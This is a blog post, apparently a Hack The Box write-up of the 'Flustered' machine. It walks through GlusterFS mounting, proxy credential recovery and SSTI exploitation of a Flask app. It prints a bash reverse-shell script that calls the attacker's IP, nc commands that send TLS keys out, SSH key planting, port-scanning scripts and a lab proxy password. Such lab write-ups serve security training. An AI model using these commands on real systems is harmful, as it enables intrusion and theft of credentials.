---
layout: post
title:  "Flustered Writeup - Hack The Box"
date:   2023-11-19
desc: "Exploitation Squid Proxy & GlusterFS & Azure Storage, Information Leakage, Server Side Template Injection"
keywords: "HTB,OSCP,eWPTXv2,eCPPTv2,OSWE,eJPT,eWPT,Medium"
categories: [HTB]
tags: [HTB,OSCP,eWPTXv2,eCPPTV2,OSWE,eJPT,eWPT,Linux,SquidProxy,GlusterFS,AzureStorage,SSTI,Medium]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

I'm going to remake this box, [Hack The Box](https://www.hackthebox.com/){:target="_blank"} **Flustered**, which I already did in a live of **Tito S4vitar**. It is a machine with a **Linux OS**, classified as **Medium**, where the complexity is not in the vulnerabilities, but in my opinion, to know new technologies and to be able to interact with them, investigating on how to install and use programs in client mode to filter information.

<br/><br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered.png" width="100%" style="margin: 0 auto;display: block
; max-width: 400px;">
<br/><br/>

I deploy the box with **[htbExplorer](https://github.com/s4vitar/htbExplorer){:target="_blank"}** and see if I already have connectivity with it by sending a packet to the victim machine to see if it responds and all goes well. I can validate the **OS** that the victim machine has installed and I can enumerate with `nmap` the ports that it has exposed, but starting with the **TCP** protocol and **open**. I find some known and others not so many.

```bash
./htbExplorer -d Flustered
```

```bash
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.11.131 -oG allPorts
```
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_00.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I use `nmap` to learn about services and versions by launching basic recognition **scripts**, I find a lot of information that I can use for the **exploitation** phase. As a first step I can try to know the **codename** of the victim machine by searching the internet with ***Launchpad*** (it tells me which **buster** can be the candidate). There are two domains that I add to my **hosts** so that my machine can resolve correctly when accessing them, I also see that a **Squid Proxy** is being deployed.

```bash
nmap -sCV -p22,80,111,3128,24007,49152,49153 10.10.11.131 -oN targeted

cat targeted
# OpenSSH 7.9p1 Debian 10+deb10u2
# duckduckgo.com --> OpenSSH 7.9p1 10+deb10u2 launchpad      Buster!

# nginx 1.14.2
# duckduckgo.com --> nginx 1.14.2 launchpad                  Buster!

# --> steampunk-era.htb
# --> 3128/tcp  open  http-proxy  Squid http proxy 4.6
# --> 49152/tcp open  ssl/unknown.. commonName=flustered.htb

nvim /etc/hosts
```

<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_01.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_02.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Analyzing the certificate with `openssl` corresponding to the service on port **49152**, which uses the **HTTPS** protocol, I cannot find relevant information, such as domains or other subdomains owned by the box. If I try to get information about the technologies used in the web service exposed on port **80**, using `whatweb`, I don't see anything interesting at the moment, but if I access from the browser, I don't see any content. Analyzing the **source code**, I only see in the title about a possible launch of the web page. Accessing from the browser to port **3128**, I am not allowed to see the content, which confirms me about the operation of a proxy to access the various resources on the victim machine. I use `curl` with the parameter `--proxy`, to use the **Squid Proxy** to access the service on port **80** and I do not have the necessary permissions.

> **[Squid Proxy](https://www.alibabacloud.com/blog/what-is-squid-proxy_599982){:target="_blank"}** is an open-source caching and forwarding web proxy server that operates as an intermediary between client and servers on a network. It acts as a gateway, enabling clients to access various internet resources such as websites, files, and other content from servers.

```bash
openssl s_client -connect 10.10.11.131:49152

whatweb http://flustered.htb

man curl

#   -x, --proxy [protocol://]host[:port]
#   Use the specified proxy.
#   The proxy string can be specified with a protocol:// prefix. No protocol specified or http:// will be treated as HTTP proxy. Use socks4://, socks4a://, socks5:// or socks5h:// to request a specific SOCKS version to be used. (The protocol support was added in curl 7.21.7)

curl --proxy http://10.10.11.131:3128 http://10.10.11.131
# --> Cache Access Denied.      :(
```

<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_03.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_04.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_05.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

There is another port with an unknown service for me, but if I search the internet for "**port 24007**" it already suggests a service name for it, **glusterfs**. Now that I know what system may be running, I search for some package with `apt` (**gluster**), to interact and get information from the **glusterfs** system, and I find a binary that seems to be for client mode and another for server, I will install both just in case. if I search now with `man`, more information about the `gluster` command I see that I can list the volumes and I find two, **vol1** and **vol2**.

> The **Gluster File System**, or **GlusterFS**, is a multi-scalable NAS file system initially developed by Gluster Inc. It allows multiple file servers to be aggregated over Ethernet or Infiniband RDMA interconnects in a large parallel network file environment. It allows multiple file servers over Ethernet or Infiniband RDMA interconnects to be aggregated in a large parallel network file environment.

> **Network-attached storage** (**NAS**) is dedicated file storage that enables multiple users and heterogeneous client devices to retrieve data from centralized disk capacity. Users on a local area network (LAN) access the shared storage via a standard Ethernet connection. NAS devices typically don't have a keyboard or display and are configured and managed with a browser-based utility. Each NAS resides on the LAN as an independent network node, defined by its own unique IP address.

```bash
apt search glusterfs
# --> client && server

apt install glusterfs-client glusterfs-server
gluster               # :)
man gluster

gluster --remote-host=10.10.11.131 volume list
#        vol1, vol2
```

<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_06.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_07.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_08.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I search on the internet how to access these volumes (**[mount glusterfs](https://docs.gluster.org/en/main/Administrator-Guide/Setting-Up-Clients/#manually-mounting-volumes){:target="_blank"}**), I find the information and the command I need, I have to mount the volumes and then I can list their content. I try with the first one but I get an error, and it suggests me to read the **logs**, if I search about the error, I find that the machine is not being able to resolve the **flustered** host, so I add it and it seems solved, but now I get another one, but in this case I can not solve it because it is related to certificates, which for the moment I don't know what it is about.

```bash
# sudo mount -t glusterfs glusterfs01.yallalabs.local:/volume_name /data
mount -t glusterfs 10.10.11.131:/vol1 /mnt/glustered_fs
# --> Mount failed. Check the log file  for more details.

cat /var/log/glusterfs/mnt-glustered_fs.log
# --> DNS resolution failed on host flustered

nvim /etc/hosts
# flustered

cat /var/log/glusterfs/mnt-glustered_fs.log
# --> could not load our cert at /etc/ssl/glusterfs.pem
```

<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_09.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_10.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_11.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I can try to mount the **vol2**, and it is done without any problem, listing the content I see a structure that makes me think of a **MariaDB** database, I look for the ***aria_log.00000001*** file in my system and I find it in the **MariaDB** directory installed in my machine. The file structures are very similar, and if I use strings in the **mysql_upgrade_info** file I see that the database version of the victim machine is outdated but corresponds to **MariaDB**.

> **[Aria](https://mariadb.com/kb/en/aria-faq/){:target="_blank"}** is a storage engine for MySQL and MariaDB. It was originally developed with the goal of becoming the default transactional and non-transactional storage engine for MariaDB and MySQL. It has been in development since 2007 and was first announced on Monty's blog. The same core MySQL engineers who developed the MySQL server and the MyISAM, MERGE, and MEMORY storage engines are also working on Aria.

```bash
mount -t glusterfs 10.10.11.131:/vol2 /mnt/gluster_fs      # :):)

locate aria_log.00000001
# /var/lib/mysql/aria_log.00000001          <--

cd /var/lib/mysql
strings mysql_upgrade_info
# --> 10.5.12-MariaDB

cd /mnt/gluster_fs
strings mysql_upgrade_info
# --> 10.3.31-MariaDB             Outdated!!
```

<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_12.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_13.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

To access the **DB** information, I will create a container with the same version of **MariaDB**, with the exception of mounting a volume with the data I got from the victim machine (**vol2**). Once the container is created I try to run `mysql`, but I get an error that I will have to fix, researching on the internet.

```bash
docker rm $(docker ps -a -q) --force          # Deleta all!!

cd /tmp
mkdir mysql_files

cp /mnt/gluster_fs /tmp/mysql_files
chown b4rt0:b4rt0 -R /tmp/mysql_files

docker ps -a
docker run --name mariadb -v /tmp/mysql_files:/var/lib/mysql -d mariadb:10.3.31

docker images
docker ps -a             # :)
docker exec -it mariadb bash
```

> **Container**:

```bash
whoami
hostname -I
# 172.17.0.2

cd /var/lib/mysql
ls -l

which mysql
mysql
# --> Plugin 'unix_socket' is not loaded          :(
```

<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_14.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_15.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_16.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_17.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I find the solution, you must **[enable Unix socket authentication](https://geekrewind.com/fix-mariadb-plugin-unix_socket-is-not-loaded-error-on-ubuntu-17-04-17-10/){:target="_blank"}** in the MariaDB configuration file. If I access the container again, I go to the directory where the file should exist, but the directory is empty, so I have to create it. I am going to create again the container for MariaDB, for this I delete the container and the image that I created previously, as well as the image. But now I am not only going to mount a volume with the data from **vol1**, I am also going to link the MariaDB configuration file that I just created (in the article that I found on the Internet, it provides me with a model, I just have to specify that it is for a **MariaDB** and not for **MySQL**). Now I can run `mysql` as the `root` user and access the information.

> **50-server.conf**

```sql
[mariadb]
plugin-load-add = auth_socket.so
```

```bash
cd /tmp
nvim 
docker exec -it mariadb bash
```

> **Container**:

```bash
ls -l /etc/mysql/mariadb.conf.d
```

> **Host**:

```bash
docker stop mariadb
docker ps
docker ps -a
docker ps -a -q
docker rm $(docker -a -q)
docker ps -a
docker rmi $(docker images -q)

docker run --name mariadb -v /tmp/mysql_files:/var/lib/mysql -v /tmp/50-server.cnf:/etc/mysql/mariadb.conf.d/50-server.cnf -d mariadb:10.3.31
docker exec -it mariadb bash
```

> **Container**:

```bash
whoami
which mysql
mysql
 ```

<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_18.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_19.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_20.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_21.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_22.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I list the databases, I find the credentials to be able to access the exposed service on port **80** through the Squid Proxy. Since I got what I needed I can now remove the container and the docker image, unmount file system **vol2** also.

> **Container**:

```sql
show databases;
use squid;
show tables;
describe passwd;
select user,password from passwd;
```

> **Host**:

```bash
docker rm $(docker ps -a -q) --force
docker ps -a
docker images
docker rmi ....
docker images

umount /mnt/gluster_fs

curl --proxy "http://lance.friedman:*****@10.10.11.131:3128" http://10.10.11.131
```

<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_23.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_24.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_25.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

At this point, I don't see content in the web service on port **80**, so I'm going to use `gobuster` to enumerate directories and files. First I look for the correct parameter to use the proxy to send the requests (**`--proxy`**). The command shows me an error if I don't **URL encode** the special characters of the Squid Proxy password, so I look with the `man ascii` command for the hexadecimal representation of those characters that are generating the problem. I If I don't put the **URL** at the end of the command, I get no results, a curiosity of `gobuster`, but I find a directory **app**, which makes me suspect that I'm dealing with a **Python** application, so I search for files with `.py` extension and I find a very interesting one, `app.py`.

```bash
gobuster --help
gobuster dir --help
# --> --proxy string

gobuster dir --proxy "http://lance.friedman:....@10.10.11.131:3128" -u http://10.10.11.131 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
# --> proxy URL is invalid

man ascii
#   >  3E
#   <  3C
#   ^  5E

gobuster dir --proxy "http://lance.friedman:...%3D...%3C...%5E...@10.10.11.131:3128" -u http://127.0.0.1 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt

gobuster dir --proxy "http://lance.friedman:...%3E...%3C...%5E...@10.10.11.131:3128" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://127.0.0.1
# /app

gobuster dir --proxy "http://lance.friedman:...%3C...%3C...%5E...@10.10.11.131:3128" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://127.0.0.1/app -x py
# --> /templates      /static     /app.py
```

<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_26.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_27.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_28.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_29.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>


If I use `curl` to send a request to the **URL** where the resource `app.py` is, I see that it is the source code of the application. Analyzing a little the code, I see that it validates if I am sending data in **json** format using **GET** or **POST**, and if so, it also validates if the `siteurl` parameter exists, the application reflects its value in the web site in case the data is received, it also informs me that it uses the **Flusk** framework, everything makes me think in a **[SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md){:target="_target"}** injection. First I validate that the output is seen in the application what I send with `curl`.

```bash
curl --proxy "http://lance.friedman:o>WJ5-jD<5^m3@10.10.11.131:3128" http://127.0.0.1/app/template
curl --proxy "http://lance.friedman:o>WJ5-jD<5^m3@10.10.11.131:3128" http://127.0.0.1/app/app.py

# --> if config and "siteurl" in config:
#         return config["siteurl"]
#         else return "steampunk-era.htb"

curl -s -X GET "http://10.10.11.131" -H "Content-type: application/json" -d '{"siteurl": "oldboy"}'
```

<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_30.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_31.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I try some basic **SSTI** injections and get the expected results, now I test if I have connectivity to the attacking machine through an **SSTI** and if I make a request to my machine from the victim machine, I receive a request.

```bash
curl -s -X GET http://10.10.11.131

curl -s -X GET http://10.10.11.131 -H "Content-type: application/json" -d '{"siteurl":"oldboy"}'
curl -s -X GET http://10.10.11.131 -H "Content-type: application/json" -d '{"siteurl":" ... "}'
curl -s -X GET http://10.10.11.131 -H "Content-type: application/json" -d '{"siteurl":" ... "}'

tcpdump -i tun0 icmp -n
curl -s -X GET "http://10.10.11.131" -H "Content-type: application/json" -d '{"siteurl": " ... "}'
```

<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_32.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_33.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_34.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I just have to create a malicious `index.html` file that sends me a **Reverse Shell** and through the **SSTI** I will try to access this resource on my machine, so that its code is interpreted with `bash` and get the **Reverse Shell**.

```bash
nvim index.html
```

> **`index.html`**

```bash
#!/bin/bash

bash -i >&/dev/tcp/10.10.14.8/443 0>&1
```

> **Host**:

```bash
python3 -m http.server 80
curl -s -X GET http://10.10.11.131 -H "Content-type: application/json" -d '{"siteurl":" ... "}'

sudo nc -nlvp 443
curl -s -X GET http://10.10.11.131 -H "Content-type: application/json" -d '{"siteurl":" ... "}'
```

<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_35.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_36.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

In order to have a better console I am going to make a treatment of it. If I list a little bit the system I can't find much, but I remember that I couldn't mount the **GlusterFS vol1**, which gives me a little clue, to look for those certificates I needed. If I look in the directory where I was trying to load them I find them, so it would be enough to send them to my attacking machine with `nc` and then verify their integrity with `md5sum`. If now I try to mount the volume, it generates an error, but reviewing the **log** I see that it searches in a different directory, so I just move the certificates and I could mount the volume **vol1**. When accessing the directory, by the structure and the folders it has, it seems to be the home of some user. And I see the **.ssh** folder, which can help me to perform a **User Pivoting** using **ssh**.

```bash
script /dev/null -c bash        [ctrl+z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128

which pkexec
which pkexec | xargs ls -l              # Is NOT SUID       :(

cd /home
cd jennifer                             # Permision denied  :(
grep "sh$" /etc/passwd                  # jennifer

cd /etc/ssl
ls -l                                   # There they are!!!
```

> **File transfer**:

```bash
# Attacker Machine
cd /etc/ssl

nc -nlvp 443 > glusterfs.ca             # Then: glusterfs.key, glusterfs.pem
md5sum glusterfs.ca
```

```bash
# Victim Machine
nc 10.10.14.8 443 < glusterfs.ca        # Then: glusterfs.key, glusterfs.pem
md5sum glusterfs.ca
```

```bash
mount -t glusterfs 10.10.11.131:/vol1 /mnt/flustered
```

<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_37.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_38.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_39.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_40.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_41.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

To perform an **User Pivoting** using **SSH**, I just need to create the keys on my machine with `ssh-keygen` and use the public key to save it as **authorized_keys** in the **.ssh** folder of the home of the user I am going to impersonate, using the mounted **GlusterFS** volume. Once I access the machine, I perform a basic enumeration, search for **Capabilities** or binaries with **SUID** privileges, and other exploit vectors but find nothing. But if I see the **Hostname**, apart from the typical HTB, also as IP address that of a container, so surely they exist on the machine. I create a script to search for containers and I find one, and if I search by the ports that it has active, it has the **10000** open.

```bash
cd /root
ssh-keygen
cat id_rsa.pub | tr -d '\n' | xclip -sel clip

cd /mnt/flustered/.ssh
echo '.....' > authorized_keys
ssh jennifer@10.10.11.131                   # :)

id
groups
sudo -l                                     # :(
echo $PATH                                  # Export my path!!

export PATH=.......

sudo -l                                     # :(
getcap -r / 2>/dev/null
find \-perm -4000 2>/dev/null

ip a
hostname -I
# --> 10.10.11.131 172.17.0.1       docker!!

docker image
docker ps                                   # Im not privileges!!!

# Host Discovery - Docker container
touch host_discovery.sh
chmod +x !$
```

> **host_discovery.sh** script:

```bash
#!/bin/bash

for host in $(seq 1 254); do
  timeout 1 bash -c "ping -c 1 172.17.0.$host" &>/dev/null && echo "[+] Host 172.17.0.$host - ACTIVE" &
done; wait
```

```bash
./host_discovery.sh
# [+] Host 172.17.0.1 - ACTIVE
# [+] Host 172.17.0.2 - ACTIVE            <---

touch port_discovery.sh
chmod +x !$
```

> **port_discovery.sh** script:

```bash
#!/bin/bash

for port in $(seq 1 65535); do
  timeout 1 bash -c "echo '' >/dev/tcp/172.17.0.2/$port" &>/dev/null && echo "[+] Port $port - OPEN" &
done; wait
```

```bash
./portDiscovery.sh
# [+] Port 10000 - OPEN           <-- What is it???       http, mysql, ...?
```

<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_42.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_43.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_44.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_45.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I make a request with `curl` to the local victim container on port **10000**, I get a response. I am going to use **SSH**, to perform a local port forwarding, to bring port 10000 from the container to my machine and analyze it better. If I access it from the browser I get an error message, and if I search for it on the **Internet**, it already suggests that it is the **Azure Storage Platform** for the cloud. I search about the program that I must install to be able to access its resources, and I find important information that suggests me to install with `snap` the **[storage-explorer](https://snapcraft.io/install/storage-explorer/ubuntu){:target="_blank"}** package, but once installed I get errors in its execution, maybe due to my **Parrot OS**, I am going to mount a new Virtual Machine with an **Ubuntu**, to see if I have more luck.

> The **[Azure Storage platform](https://learn.microsoft.com/en-us/azure/vs-azure-tools-storage-manage-with-storage-explorer?tabs=windows){:target="_blank"}** is Microsoft's cloud storage solution for modern data storage scenarios. Azure Storage offers highly available, massively scalable, durable, and secure storage for a variety of data objects in the cloud. Microsoft Azure Storage Explorer is a standalone app that makes it easy to work with Azure Storage data on Windows, macOS, and Linux.
> **Victime Machine**:

```bash
curl http://127.17.0.2:1000             # :)
```

> **Attacker machine**:

```bash
# Local Port Forwarding
ssh jennifer@10.10.11.131 -L 10000:172.17.0.2:10000
lsof -i:10000

nmap -sCV -p10000 127.0.0.1
# --> snet-sensor-mgmt?

curl -s -X GET http://127.0.0.1:10000/
# --> InvalidQueryParameterValue
```

<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_46.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_47.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I will quickly set up a new virtual machine with [VMWare](https://www.vmware.com/){:target="_blank"} and download the **iso** image from the official [Ubuntu website](https://ubuntu.com/download/desktop){:target="_blank"}. I follow all the instructions, making very few modifications and I already have the machine for testing, I think that in the resources stored in the **Azure Storage Platform** is stored the information that I will need to root the box.

> **Ubuntu**: Storage Explorer is available in the Snap Store. The Storage Explorer snap installs all of its dependencies and updates when new versions are published to the Snap Store.

<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_48.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_49.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_50.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_51.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_52.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_53.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_54.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

First I update the packages installed in the operating system, after that I can install `snap` and `storage-explorer`. If I run it for the first time, I am informed that I must first enter a command to authenticate. After running the program correctly and exploring the features, I find a way to set up a new connection, but I must have a password, which has a similar format in **Base64**.

```bash
sudo su
apt update
apt upgrade -y

setxkbmap es                     # Keyboard lenguage settings!!!

apt install snapd
snap install storage-explorer

storage-explorer
snap connect starage-explorer:password-manager-service:password-manager-service

storage-explorer
```
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_55.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_56.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_57.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_58.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_59.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I access the victim machine, I can search for files that have a name similar to `key`, I find one, which can be read by the user `jennifer`. If I open it, its content has the format requested by the `storage-explorer` application. In order to establish the connection from the **Ubuntu** machine, I will have to transfer the configuration file for the **Hack The Box** VPN. But I will take advantage before, to create the **SSH** keys on the **Ubuntu machine** and transfer the public key to my attacker machine, so that I can upload it to the victim machine as an authorized key, so I will be able to access with **SSH** without being asked for a password, from the **Ubuntu Virtual Machine** (To do all this, I look carefully at the network interfaces of both machines), I must remember to perform **Local Port Forwarding**. I perform all the necessary steps, I configure the data in `storage-explorer` but I still can't access the resources

> **Victime machine**:

```bash
find \-name key 2>/dev/null
# --> ./var/backup/key

ls -l ./var/backup/key                  # --> jennifer can read!!!

cat /var/backup/key
```

> **Ubuntu Virtual Machine**:

```bash
cd /root
mkdir .ssh
ssh-keygen

cat id_rsa.pub           # :)
```

> **Attacker machine**:

```bash
/mnt/flustered/.ssh
nc -nlvp > authorized_keys
```

> **Ubuntu Virtual Machine**:

```bash
nc 192.168.75.128 443 < id_rsa.pub

ssh jennifer@10.10.11.131
ssh jennifer@10.10.11.131 -L 10000:172.17.0.2:10000

nmap -sCV -p10000 127.0.0.1
```

<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_60.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_61.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_62.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_63.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_64.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_65.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_66.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_67.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_68.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_69.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_70.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_71.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_72.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I have tried to solve the errors in different ways, but I can't find a way to do it correctly. But I think that being a box with an old **Operative System**, maybe I should mount a **Virtual Machine** with an Ubuntu version that is not the latest. I set everything up again, creating the VM, transferring the necessary files, setting up the Local Port Forwarding, and finally I set up the `storage-explorer` and I have access to the resources. I find an **ssh key** of the `root` user, I have to give it the correct permissions and I can access the machine as the user with the highest privileges.

```bash
touch id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@10.10.11.131
```

<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_73.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_74.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_75.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/flustered_writeup/Flustered_76.png" width="100%" style="margin: 0 auto;display: block
